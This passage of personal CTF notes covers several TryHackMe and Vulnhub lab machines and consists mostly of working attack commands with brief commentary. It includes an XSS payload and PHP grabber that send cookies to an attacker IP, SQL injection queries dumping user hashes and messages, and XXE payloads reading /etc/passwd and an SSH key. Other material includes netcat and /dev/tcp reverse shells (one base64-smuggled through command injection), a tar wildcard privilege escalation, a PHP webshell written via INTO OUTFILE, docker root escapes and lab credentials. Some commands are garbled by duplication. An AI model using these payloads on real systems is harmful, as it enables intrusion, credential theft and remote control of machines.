system@vulnnet.thm</p><p>8y7TKQDpucKBYhwsb</p><p></p><p>getcap -r / 2&gt;/dev/null</p><p>we see openssl capabilities</p><p><a href="https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/">https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</a></p><p></p><p>compile on our box and run on target. </p><p></p><p><img src="images/429-1.png" alt="images/429-1.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--The_Marketplace_434.html"></a><h1 class='title level-4'>The Marketplace</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--The_Marketplace--nmap_435.html"></a><h1 class='title level-5'>nmap</h1><br/><p>PORT      STATE SERVICE REASON         VERSION</p><p>22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1</p><p>|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=</p><p>|   256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar</p><p>80/tcp    open  http    syn-ack ttl 60 nginx 1.19.2</p><p>|_http-title: The Marketplace</p><p>| http-robots.txt: 1 disallowed entry </p><p>|_/admin</p><p>| http-methods: </p><p>|_  Supported Methods: GET HEAD POST OPTIONS</p><p>|_http-server-header: nginx/1.19.2</p><p>32768/tcp open  http    syn-ack ttl 60 Node.js (Express middleware)</p><p>| http-robots.txt: 1 disallowed entry </p><p>|_/admin</p><p>|_http-title: The Marketplace</p><p>| http-methods: </p><p>|_  Supported Methods: GET HEAD POST OPTIONS</p><p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--The_Marketplace--PORT_80_436.html"></a><h1 class='title level-5'>PORT 80</h1><br/><p><a href="http://10.10.208.90/item/1">http://10.10.208.90/item/1</a></p><p></p><p><img src="images/436-1.png" alt="images/436-1.png" /></p><p></p><p></p><p>BOTH PARAMATERS IN LISTING FORM IS VULNERABLE TO XSS </p><p><a href="http://10.10.208.90:32768/new">http://10.10.208.90:32768/new</a></p><p>&lt;script&gt;alert(&#39;uwu&#39;);&lt;/script&gt;</p><p></p><p></p><p><a href="http://10.10.208.90:32768/new">http://10.10.208.90:32768/new</a></p><p></p><p>&lt;script&gt;document.location=&#39;<a href="http://10.13.31.108/grabber.php?cmd='+document.cookie">http://10.13.31.108/grabber.php?cmd=&#39;+document.cookie</a>&lt;/script&gt;</p><p></p><p>gedit grabber.php</p><p></p><p>&lt;?php</p><p>$cookie = $_REQUEST[&#39;cmd&#39;];</p><p>$fp = fopen(&#39;cookies.txt&#39;, &#39;a+&#39;);</p><p>fwrite($fp, &#39;Cookie:&#39; .$cookie.&quot;\r\n&quot;);</p><p>fclose($fp);</p><p>?&gt;</p><p></p><p></p><p><img src="images/436-2.png" alt="images/436-2.png" /></p><p>And we get the token!</p><p></p><p></p><p>but this is only our token. This doesn&#39;t help us</p><p></p><p><img src="images/436-3.png" alt="images/436-3.png" /></p><p></p><p>However when I report it to admin, we get a JWT back </p><p></p><p><img src="images/436-4.png" alt="images/436-4.png" /></p><p>This time, the correct one :)</p><p></p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjUwMTI1NzR9.bKWPWlxIiMajLlO93q7tJ1_hdlBnK9-mtapkNr6C6w0</p><p></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p>Payload data:</p><p></p><p>{</p><p>  &quot;userId&quot;: 2,</p><p>  &quot;username&quot;: &quot;michael&quot;,</p><p>  &quot;admin&quot;: true,</p><p>  &quot;iat&quot;: 1665012574</p><p>}</p><p></p><p><img src="images/436-5.png" alt="images/436-5.png" /></p><p></p><p>As we can see this location gives us a 403, which means we don&#39;t have access with our current privileges</p><p></p><p>However, we managed to steal the admins token, so let&#39;s see if we can access now</p><p><img src="images/436-6.png" alt="images/436-6.png" /></p><p></p><p>Lookie lookie! :)</p><p></p><p><img src="images/436-7.png" alt="images/436-7.png" /></p><p></p><p>So currently we are michael</p><p></p><p></p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjUwMTI1NzR9.bKWPWlxIiMajLlO93q7tJ1_hdlBnK9-mtapkNr6C6w0</p><p></p><p></p><p></p><p></p><p>NEXT WE FIND AN SQLI</p><p><a href="http://10.10.208.90:32768/admin?user=2%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL--">http://10.10.208.90:32768/admin?user=2%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL--</a></p><p></p><p>So we know there are 6 columns</p><p></p><p></p><p><a href="http://10.10.208.90:32768/admin?user=2%20or%20sleep(5)--">http://10.10.208.90:32768/admin?user=2%20or%20sleep(5)--</a></p><p>Makes the application sleep for 5 seconds</p><p></p><p></p><p>?user=-3 UNION SELECT NULL, @@version, NULL, NULL--</p><p><img src="images/436-8.png" alt="images/436-8.png" /></p><p></p><p></p><p></p><p>?user=-3 union select NULL, group_concat(SCHEMA_NAME), NULL, NULL from INFORMATION_SCHEMA.schemata--</p><p><img src="images/436-9.png" alt="images/436-9.png" /></p><p></p><p></p><p>?user=-3 union select NULL, group_concat(table_name), NULL, NULL from INFORMATION_SCHEMA.tables where table_schema=&#39;marketplace&#39;--</p><p><img src="images/436-10.png" alt="images/436-10.png" /></p><p></p><p>?user=-3 union select NULL, group_concat(table_name, &#39;:&#39;, column_name), NULL, NULL from INFORMATION_SCHEMA.columns where table_schema=&#39;marketplace&#39;--</p><p><img src="images/436-11.png" alt="images/436-11.png" /></p><p></p><p></p><p>?user=-3 union select NULL, group_concat(password), NULL, NULL from marketplace.users--</p><p><img src="images/436-12.png" alt="images/436-12.png" /></p><p></p><p>I tried cracking these hashes, but that doesn&#39;t seem to be the way the creator wants it to happen so</p><p></p><p>?user=-12313122 UNION SELECT NULL, GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=&#39;marketplace&#39; AND table_name=&#39;messages&#39;--</p><p><img src="images/436-13.png" alt="images/436-13.png" /></p><p></p><p></p><p>?user=-3 union select NULL, group_concat(user_from, &#39;UWU&#39;, user_to, &#39;UWU&#39;, message_content), NULL, NULL from marketplace.messages--</p><p><img src="images/436-14.png" alt="images/436-14.png" /></p><p></p><p>User ID 1 password:</p><p>@b_ENXkGYUCAv3zJ</p><p></p><p>ssh jake@10.10.208.90</p><p>@b_ENXkGYUCAv3zJ</p><p></p><p><img src="images/436-15.png" alt="images/436-15.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--The_Marketplace--PORT_80--jwt_437.html"></a><h1 class='title level-6'>jwt</h1><br/><p>ORIGINAL:</p><p>/report/1</p><p></p><p>header::</p><p></p><p>}</p><p>  &quot;alg&quot;: &quot;HS256&quot;,</p><p>  &quot;typ&quot;: &quot;JWT&quot;</p><p>}</p><p></p><p>data:</p><p></p><p>{</p><p>  &quot;userId&quot;: 4,</p><p>  &quot;username&quot;: &quot;a&quot;,</p><p>  &quot;admin&quot;: false,</p><p>  &quot;iat&quot;: 1665008445</p><p>}</p><p></p><p>=======</p><p>Modified:</p><p></p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjY1MDA4NDQ1fQ.vsKHSFXtpxudbHcdfy1cIA7jAAx8Ot0ZSyAi9Rt6Sys</p><p></p><p>{</p><p>  &quot;userId&quot;: 4,</p><p>  &quot;username&quot;: &quot;admin&quot;,</p><p>  &quot;admin&quot;: true,</p><p>  &quot;iat&quot;: 1665008445</p><p>}</p><p></p><p></p><p>They have sufficient filtering in place for this</p><p></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--The_Marketplace--privesc_440.html"></a><h1 class='title level-5'>privesc</h1><br/><p></p><p><img src="images/440-1.png" alt="images/440-1.png" /></p><p><img src="images/440-2.png" alt="images/440-2.png" /></p><p></p><p>Password works, now lets privesc!</p><p></p><p>WHAT WE&#39;RE DOING HERE IS ESSENTIALLY MAKING USE OF THE SHELL FUNCTION FROM TAR FOUND ON GTFOBINS (however a slight variation)</p><p><a href="https://gtfobins.github.io/gtfobins/tar/#shell">https://gtfobins.github.io/gtfobins/tar/#shell</a></p><p>and since jake can run that script from michael with sudo -u, we will be able to get onto michael </p><p></p><p></p><p></p><p>sudo -u michael /opt/backups/backup.sh</p><p></p><p>tar xC /tmp/ -f backup.tar</p><p></p><p></p><p>Made a shell called shell.sh</p><p></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.13.31.108 443 &gt;/tmp/f</p><p></p><p>touch &quot;/opt/backups/--checkpoint=1&quot;</p><p>touch &quot;/opt/backups/--checkpoint-action=exec=sh shell.sh&quot;</p><p></p><p></p><p><img src="images/440-3.png" alt="images/440-3.png" /></p><p></p><p>python3 -c &#39;import pty;pty.spawn(&quot;/bpython3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p></p><p>docker run -v /:/mnt --rm -it alpinedocker run -v /:/mnt --rm -it alpine chroot /mnt sh</p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Mustacchio_460.html"></a><h1 class='title level-4'>Mustacchio</h1><br/><p>&lt;Name&gt;Mitchell Moser&lt;/Name&gt;</p><p>&lt;Author&gt;Gimme the Loot&lt;/Author&gt;</p><p>&lt;Comment&gt;&amp;a;&lt;/Comment&gt;</p><p>  </p><p>  </p><p>  <strong><code><span style="color:#999999;">&lt;?xml version=&quot;1.0&quot;?&gt;</span></code></strong><code></code></p><p><code>  </code><strong><code><span style="color:#999999;">&lt;!DOCTYPE foo [</span></code></strong><strong><code><span style="color:#999999;"></span></code></strong></p><p><strong><code><span style="color:#999999;">   &lt;!ELEMENT foo ANY &gt;</span></code></strong><code></code></p><p><code>   </code><strong><code><span style="color:#999999;">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span></code></strong><code></code></p><p><code>  ]&gt;</code><code></code></p><p><code>  &lt;Comment&gt;</code><code></code></p><p><code>    &lt;Name&gt;Gerh&lt;/Name&gt;</code><code></code></p><p><code>    &lt;Author&gt;BinaryChaos&lt;/Author&gt;</code><code></code></p><p><code>    &lt;Comment&gt;</code><code><span style="color:#800080;">&amp;xxe;</span></code><code>&lt;/Comment&gt;</code><code></code></p><p><code>  &lt;/Comment&gt;</code></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Mustacchio--Port_80_461.html"></a><h1 class='title level-5'>Port 80</h1><br/><p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p><p>&lt;!DOCTYPE data [ &lt;!ELEMENT data ANY &gt;</p><p>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</p><p>&lt;xml&gt;</p><p>	&lt;name&gt;&amp;xxe;&lt;/name&gt;</p><p>	&lt;author&gt;&amp;xxe;&lt;/author&gt;</p><p>	&lt;comment&gt;&amp;xxe;&lt;/comment&gt;</p><p>&lt;/xml&gt;</p><p></p><p></p><p></p><p></p><p></p><p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p><p>&lt;!DOCTYPE data [ &lt;!ELEMENT data ANY &gt;</p><p>&lt;!ENTITY xxe SYSTEM &quot;file:///home/barry/.ssh/id_rsa&quot; &gt;]&gt;</p><p>&lt;xml&gt;</p><p>	&lt;name&gt;&amp;xxe;&lt;/name&gt;</p><p>	&lt;author&gt;&amp;xxe;&lt;/author&gt;</p><p>	&lt;comment&gt;&amp;xxe;&lt;/comment&gt;</p><p>&lt;/xml&gt;</p><p></p><p></p><p></p><p></p><p></p><p>===</p><p></p><p>THEN WE GET PRIV ID_RSA KEY</p><p></p><p><img src="images/461-1.png" alt="images/461-1.png" /></p><p>CRACKED</p><p></p><p><img src="images/461-2.png" alt="images/461-2.png" /></p><p></p><p>cd /home/joe</p><p></p><p>-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log</p><p></p><p>strings live_log</p><p><img src="images/461-3.png" alt="images/461-3.png" /></p><p></p><p><img src="images/461-4.png" alt="images/461-4.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--yotf_479.html"></a><h1 class='title level-4'>yotf</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--yotf--notes_480.html"></a><h1 class='title level-5'>notes</h1><br/><p>No CVE. Not vulnerable services. Only http and smb open. Need credentials to get authorized to webserver.</p><p></p><p><img src="images/480-1.png" alt="images/480-1.png" /></p><p></p><p>Found likely username. Time to bruteforce</p><p></p><p>hydra -l fox -P /usr/share/wordlists/rockyou.txt 10.10.56.230 http-get  -V -e nsr -f -t 50 </p><p></p><p><img src="images/480-2.png" alt="images/480-2.png" /></p><p></p><p>Found a new user</p><p>enum4linux -a IP was the only scan that found rascal. Not nmap, and not enum4linug-ng</p><p></p><p><img src="images/480-3.png" alt="images/480-3.png" /></p><p></p><p><img src="images/480-4.png" alt="images/480-4.png" /></p><p><img src="images/480-5.png" alt="images/480-5.png" /></p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p></p><p><img src="images/480-6.png" alt="images/480-6.png" /></p><p></p><p><img src="images/480-7.png" alt="images/480-7.png" /></p><p></p><p></p><p><img src="images/480-8.png" alt="images/480-8.png" /></p><p>pipe at the end also works, but only adding bash at the end will not cut it</p><p></p><p></p><p></p><p>also nice way to test</p><p><img src="images/480-9.png" alt="images/480-9.png" /></p><p></p><p><img src="images/480-10.png" alt="images/480-10.png" /></p><p></p><p>echo &#39;bash -i &amp;&gt;/dev/tcp/10.13.4.2/443 &lt;&amp;1&#39; | base64</p><p></p><p>{&quot;target&quot;:&quot;\&quot;;echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEzLjQuMi80NDMgPCYxCg | base64 -d| bash;\&quot;&quot;}</p><p></p><p><img src="images/480-11.png" alt="images/480-11.png" /></p><p></p><p></p><p></p><p></p><p>commix --url=&quot;<a href="http://10.10.158.237/assets/php/search.php">http://10.10.158.237/assets/php/search.php</a>&quot; --cookie=&#39;Authorization: Basic cmFzY2FsOmNocm9ubw==&#39; --method=POST --data=&#39;{&quot;target&quot;:&quot;test&quot;}&#39; --auth-cred=&quot;rascal:chrono&quot; --auth-type=basic --batch --level=3</p><p></p><p></p><p>commix --url=&quot;<a href="http://10.10.158.237/assets/php/search.php">http://10.10.158.237/assets/php/search.php</a>&quot; --cookie=&#39;Authorization: Basic cmFzY2FsOmNocm9ubw==&#39; --method=POST --data=&#39;{&quot;target&quot;:&quot;test&quot;}&#39; --auth-cred=&quot;rascal:chrono&quot; --auth-type=basic --os-cmd=&#39;ping -c 2 localhost&#39;</p><p></p><p></p><p>{&quot;target&quot;:&quot;\&quot;;bash -i &amp;&gt;/dev/tcp/10.13.4.2/443 &lt;&amp;1; \&quot;&quot;}</p><p>7b22746172676574223a225c223b62617368 2d69 263e2f6465762f7463702f31302e31332e342e322f343433 3c26313b 5c22227d</p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--bookstore_482.html"></a><h1 class='title level-4'>bookstore</h1><br/><p><a href="https://tryhackme.com/room/bookstoreoc">https://tryhackme.com/room/bookstoreoc</a></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--bookstore--notes_483.html"></a><h1 class='title level-5'>notes</h1><br/><p>change from v2 to v1 and changed id paramater to show paramater. allows for LFI</p><p><img src="images/483-1.png" alt="images/483-1.png" /></p><p></p><p><img src="images/483-2.png" alt="images/483-2.png" /></p><p></p><p><a href="http://10.10.162.204:5000/console">http://10.10.162.204:5000/console</a></p><p><img src="images/483-3.png" alt="images/483-3.png" /></p><p></p><p><img src="images/483-4.png" alt="images/483-4.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--olympus_554.html"></a><h1 class='title level-4'>olympus</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--olympus--notes_555.html"></a><h1 class='title level-5'>notes</h1><br/><p>victor cms</p><p></p><p><a href="http://olympus.thm/~webmaster/search.php">http://olympus.thm/~webmaster/search.php</a></p><p>sqli? yes, in the search post request</p><p></p><p>sqlmap -u olympus.thm/~webmaster/search.php --batch --method=POST --forms --crawl=2</p><p></p><p>&gt;mysql,information_schema,performance_schema,sys,phpmyadmin,olympus</p><p></p><p></p><p>fuzz param?</p><p><a href="http://olympus.thm/~webmaster/post.php?post=6">http://olympus.thm/~webmaster/post.php?post=6</a></p><p></p><p>sqlmap -u olympus.thm/~webmaster/search.php --batch --method=POST --forms --crawl=2 </p><p></p><p></p><p><img src="images/555-1.png" alt="images/555-1.png" /></p><p></p><p></p><p><span style="color:#3f4043;">Dumps all tables, columns, and databases :DDDDDDDDDDD</span></p><p>search=GUNe&#39; UNION SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,table_name,column_name,table_schema)),NULL,NULL,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.columns#&amp;submit=</p><p></p><p><span style="color:#3f4043;">Parsing dump:</span></p><p>Inspect, Copy all from here, and save it to file called dump </p><p><img src="images/555-2.png" alt="images/555-2.png" /></p><p></p><p></p><p><span style="color:#3f4043;">Parse all dump to cleaner format:</span></p><p>cat dump | tr &#39;,&#39; &#39;\n&#39; &gt; formatted_dump.txt</p><p></p><p><span style="color:#3f4043;">Hunt for where credentials are stored:</span></p><p> cat formatted_dump.txt | grep -i pass  </p><p><img src="images/555-3.png" alt="images/555-3.png" /></p><p></p><p><img src="images/555-4.png" alt="images/555-4.png" /></p><p></p><p><img src="images/555-5.png" alt="images/555-5.png" /></p><p></p><p>search=&#39; UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#&amp;submit=</p><p></p><p></p><p></p><p>&#39; UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#</p><p>[&quot;prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C&quot;, &quot;root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK&quot;, &quot;zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC&quot;]</p><p></p><p><img src="images/555-6.png" alt="images/555-6.png" /></p><p></p><p>chats:file:olympus</p><p></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT NULL, &quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;, NULL, NULL into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;;--</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--developersRus_560.html"></a><h1 class='title level-4'>developersRus</h1><br/><p>port 80:</p><p>is web server, but havent found content there yet</p><p></p><p></p><p>port 8080:</p><p>nginx/1.18.0</p><p> is web server, and have found “progress”</p><p></p><p>port 8081:</p><p>seems is proxy server</p><p>blackice-icecap?</p><p>Werkzeug/2.2.2</p><p><a href="http://10.10.206.4:8081/console">http://10.10.206.4:8081/console</a></p><p></p><p></p><p><a href="http://10.10.206.4:8080/FUZZ">http://10.10.206.4:8080/FUZZ</a></p><p></p><p>found &quot;progress&quot; dir</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>SMTP enum:</p><p>10.10.206.4: mail exists</p><p>10.10.206.4: root exists</p><p>10.10.206.4: andy exists</p><p>10.10.206.4: news exists</p><p>10.10.206.4: erik exists</p><p>10.10.206.4: man exists</p><p>10.10.206.4: bin exists</p><p>10.10.206.4: ray exists</p><p>10.10.206.4: games exists</p><p>10.10.206.4: nobody exists</p><p>10.10.206.4: backup exists</p><p>10.10.206.4: daemon exists</p><p>10.10.206.4: proxy exists</p><p></p><p>FTP&amp;SSH bruteforce:</p><p>andy / y</p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--developersRus--progression_561.html"></a><h1 class='title level-5'>progression</h1><br/><p>$IP:8081/console</p><p></p><p><img src="images/561-1.png" alt="images/561-1.png" /></p><p></p><p>intercept request, change auth:false to true, gets me passed pin code</p><p>^ this is wrong, if u refresh it doesnt last</p><p></p><p>found ftp creds</p><p><img src="images/561-2.png" alt="images/561-2.png" /></p><p></p><p>wget -r <a href="ftp://andy:conceivable@10.10.186.207">ftp://andy:conceivable@10.10.186.207</a></p><p></p><p><img src="images/561-3.png" alt="images/561-3.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--The_Great_Escape_625.html"></a><h1 class='title level-4'>The Great Escape</h1><br/><p></p><p><a href="http://api-dev-backup:8080/exif?url=;git">http://api-dev-backup:8080/exif?url=;git</a> --git-dir  /root/.git/ log</p><p></p><p></p><p></p><p><span style="color:#3f4043;">Remote list docker images on the server:</span></p><p>docker -H 10.10.142.13:2375 images</p><p></p><p><span style="color:#3f4043;">Mount remote image and become root in docker:</span></p><p>docker -H 10.10.142.13:2375 run -v /:/mnt --rm -it frontend chroot /mnt sh</p><p></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub_380.html"></a><h1 class='title level-3'>Vulnhub</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos1_381.html"></a><h1 class='title level-4'>Symfonos1</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos1--nmap_382.html"></a><h1 class='title level-5'>nmap</h1><br/><p>PORT    STATE SERVICE     REASON         VERSION</p><p>22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEgzdI5IpQcFfjqrj7pPhaxTxIJaS0kXjIektEgJg0+jGfOGDi+uaG/pM0Jg5lrOh4BElQFIGDQmf10JrV5CPk/qcs8zPRtKxOspCVBgaQ6wdxjvXkJyDvxinDQzEsg6+uVY2t3YWgTeSPoUP+QC4WWTS/r1e2O2d66SIPzBYVKOP2+WmGMu9MS4tFY15cBTQVilprTBE5xjaO5ToZk+LkBA6mKey4dQyz2/u1ipJKdNBS7XmmjIpyqANoVPoiij5A2XQbCH/ruFfslpTUTl48XpfsiqTKWufcjVO08ScF46wraj1okRdvn+1ZcBV/I7n3BOrXvw8Jxdo9x2pPXkUF</p><p>|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD8/lJjmeqerC3bEL6MffHKMdTiYddhU4dOlT6jylLyyl/tEBwDRNfEhOfc7IZxlkpg4vmRwkU25WdqsTu59+WQ=</p><p>|   256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOinjerzzjSIgDxhdUgmP/i6nOtGHQq2ayeO1j1h5d5a</p><p>25/tcp  open  smtp        syn-ack ttl 64 Postfix smtpd</p><p>| ssl-cert: Subject: commonName=symfonos</p><p>| Subject Alternative Name: DNS:symfonos</p><p>| Issuer: commonName=symfonos</p><p>| Public Key type: rsa</p><p>| Public Key bits: 2048</p><p>| Signature Algorithm: sha256WithRSAEncryption</p><p>| Not valid before: 2019-06-29T00:29:42</p><p>| Not valid after:  2029-06-26T00:29:42</p><p>| MD5:   086e c75b c397 34d6 6293 70cd 6a76 c4f2</p><p>| SHA-1: e3dc 7293 d59b 3444 d39a 41ef 6fc7 2006 bde4 825f</p><p>| -----BEGIN CERTIFICATE-----</p><p>| MIICyzCCAbOgAwIBAgIJAJzTHaEY8CzbMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</p><p>| BAMMCHN5bWZvbm9zMB4XDTE5MDYyOTAwMjk0MloXDTI5MDYyNjAwMjk0MlowEzER</p><p>| MA8GA1UEAwwIc3ltZm9ub3MwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB</p><p>| AQDMqUx7kERzGuX2GTokAv1cRHV81loI0yEE357TgkGOQEZUA9jpAkceEpjHGdu1</p><p>| PqfMxETG0TJYdajwYAxr01H5fJmLi04OhKHyKk+yKIRpOO0uU1tvIcpSx5A2QJky</p><p>| BY+q/82SZLhx/l2xyP2jrc63mz4FSrzav/oPpNT6rxLoPIvJ8z+vnUr3qp5Ea/DH</p><p>| WRePqBVoMqjqc9EGtwND1EMGJKlZb2KeDaqdJ02K3fZQmyR0+HyYoKq93+sKk34l</p><p>| 23Q7Tzuq07ZJXHheyN3G6V4uGUmJTGPKTMZlOVyeEo6idPjdW8abEq5ier1k8jWy</p><p>| IzwTU8GmPe4MR7csKR1omk8bAgMBAAGjIjAgMAkGA1UdEwQCMAAwEwYDVR0RBAww</p><p>| CoIIc3ltZm9ub3MwDQYJKoZIhvcNAQELBQADggEBAF3kiDg7BrB5xNV+ibk7GUVc</p><p>| 9J5IALe+gtSeCXCsk6TmEU6l2CF6JNQ1PDisZbC2d0jEEjg3roCeZmDRKFC+NdwM</p><p>| iKiqROMh3wPMxnHEKgQ2dwGU9UMb4AWdEWzNMtDKVbgf8JgFEuCje0RtGLKJiTVw</p><p>| e2DjqLRIYwMitfWJWyi6OjdvTWD3cXReTfrjYCRgYUaoMuGahUh8mmyuFjkKmHOR</p><p>| sMVCO/8UdLvQr7T8QO/682shibBd4B4eekc8aQa7xoEMevSlY8WjtJKbuPvUYsay</p><p>| slgPCkgga6SRw1X/loPYutfIvK7NQPqcEM8YrWTMokknp7EsJXDl85hRj6GghhE=</p><p>|_-----END CERTIFICATE-----</p><p>|_ssl-date: TLS randomness does not represent time</p><p>|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8</p><p>80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))</p><p>|_http-server-header: Apache/2.4.25 (Debian)</p><p>|_http-title: Site doesn&#39;t have a title (text/html).</p><p>| http-methods: </p><p>|_  Supported Methods: HEAD GET POST OPTIONS</p><p>139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p>445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</p><p>MAC Address: 08:00:27:11:26:A1 (Oracle VirtualBox virtual NIC)</p><p>Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p><p></p><p>Host script results:</p><p>|_clock-skew: mean: 1h40m06s, deviation: 2h53m12s, median: 6s</p><p>| smb-security-mode: </p><p>|   account_used: guest</p><p>|   authentication_level: user</p><p>|   challenge_response: supported</p><p>|_  message_signing: disabled (dangerous, but default)</p><p>| nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</p><p>| Names:</p><p>|   SYMFONOS&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   SYMFONOS&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   SYMFONOS&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   WORKGROUP&lt;00&gt;        Flags: 